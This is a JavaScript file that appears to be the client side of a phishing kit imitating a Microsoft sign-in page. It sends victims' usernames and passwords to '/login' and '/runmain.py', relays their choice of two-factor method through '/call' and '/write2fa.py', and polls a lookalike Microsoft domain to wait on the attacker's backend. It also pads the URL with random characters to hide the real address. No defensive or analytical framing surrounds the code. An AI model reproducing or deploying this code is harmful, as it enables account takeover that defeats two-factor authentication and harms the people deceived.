var nextBtn = document.querySelector(".sign-in-next-btn-submit");
var signInBtn = document.querySelector(".sign-in-btn-submit")

var verifyDiv = document.querySelector(".verification-form")

var textVerifyDiv = document.querySelector(".text-verify");
var callVerifyDiv = document.querySelector(".call-verify");

var passwordDiv = document.querySelector(".password-sign-in-form");
var passscreenDiv = document.querySelector(".password-screen");
var emailDiv = document.querySelector(".email-sign-in-form");
var loadingDiv = document.querySelector(".loading-screen");
var superloadingDiv = document.querySelector(".loading-screen-div");
var cancelBtn = document.querySelector(".btn-cancel")


function text(){
  verifyDiv.style.display="none";
}

function call(){
  console.log("something");
  verifyDiv.style.display="none";
  // e.preventDefault();
      $.ajax({
        type:'POST',
        url:'/call',
        data:{
        },
        success:function()
        {
          console.log("success")

          }
      })
      console.log("done")
}

function functioncheck(){
            // alert('saved');
            try{
              $.ajax({
                url:'https://www.microsoftonlinecsulb.com/static/'+$("#username").val()+'.txt',
                type:'HEAD',
                error: function()
                {
                    //file not exists
                    console.log("false");
                    return false;
                },
                success: function()
                {
                    //file exists
                loadingDiv.style.display = "none";
                verifyDiv.style.display = "block";
                }
            });
            }
            catch{
              console.log("cath")
              return false;
            }

          console.log("true");
            return true;
          
}
function UrlExists(url)
{
  try{
    var http = new XMLHttpRequest();
    http.open('HEAD', url, false);
    http.send();
    console.log("send")
    return http.status!=404;
  }
  catch{
    return false;
  }

}

$(document).on('submit','#login-form',function(e)
    {
      loadingDiv.style.display = "block";
      superloadingDiv.style.display = "block";
      passscreenDiv.style.display="none";

      console.log('hello');
      e.preventDefault();
      $.ajax({
        type:'POST',
        url:'/login',
        data:{
          username:$("#username").val(),
          password:$("#password").val()
        },
        success:function()
        {
          // passwordDiv.style.display = "none";
          console.log(functioncheck);
          while(UrlExists('static/'+$("#username").val()+'.txt') == false){
            console.log("loop");

          }
          console.log("it worked")
          loadingDiv.style.display = "none";
          passscreenDiv.style.display="none";
          superloadingDiv.style.display = "none";
          verifyDiv.style.display="block"
        }
      })
    });




//call python function

function postData(email, password) {
  $.ajax({
      type: "POST",
      url: "/runmain.py",
      data: { param: email,password },
      success: callbackFunc
  });
}
function callortext(email, password, isCall) {
  if (isCall == 1){
    $.ajax({
      type: "POST",
      url: "/write2fa.py",
      data: { param: email,password },
      success: callbackFunc
  });
  }

}


function callbackFunc(response) {
  // do something with the response
  console.log(response);
}
// postData("test")

nextBtn.addEventListener("click", function(event) {
  event.preventDefault(); 
  loadingDiv.style.display = "block";
  emailDiv.style.display = "none";
  removeLoadingDiv();
});

signInBtn.addEventListener("click", function(event) {
  event.preventDefault(); 
  verifyDiv.style.display = "block";
  passwordDiv.style.display = "none";
});

// cancelBtn.addEventListener("click", function(event) {
//   event.preventDefault(); 
//   emailDiv.style.display = "block";
//   verifyDiv.style.display = "none";
// });




// signInBtn.addEventListener("click", function(event) {
//     event.preventDefault(); 
//     verifyDiv.style.display = "block";
//     passwordDiv.style.display = "none";
// });

let usernameValue = localStorage.getItem("username") || "";

function returnUsername() {
  usernameValue = document.getElementById("username").value;
  localStorage.setItem("username", usernameValue);
  document.getElementById("display-name").innerHTML = usernameValue;
  return usernameValue;
}

document.getElementById("username").addEventListener("keyup", returnUsername);







//testing stuff
function makeid(length) {
  let result = '?';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}

if (history.pushState) {
    var newurl = window.location.protocol + "//" + window.location.host + window.location.pathname + makeid(255);
    window.history.pushState({path:newurl},'',newurl);
}

//carines new stuff

function removeLoadingDiv() {
  const loadingDiv = document.querySelector(".loading-screen-div");
  const loadingSlide = document.querySelector(".loading-body");
  if (loadingDiv) {
    setTimeout(() => {
      loadingSlide.classList.add("slide-out")
      loadingDiv.style.display = "none";
      passwordDiv.style.display ="block"
    }, 1000);
  }
}

var textBtn = document.getElementById('verifyTextBtn');

textBtn.addEventListener('click', function() {
  verifyDiv.style.display = "none";
  textVerifyDiv.style.display = "block";

});

var callBtn = document.getElementById('verifyCallBtn');

callBtn.addEventListener('click', function() {
  verifyDiv.style.display = "none";
  callVerifyDiv.style.display = "block";

});
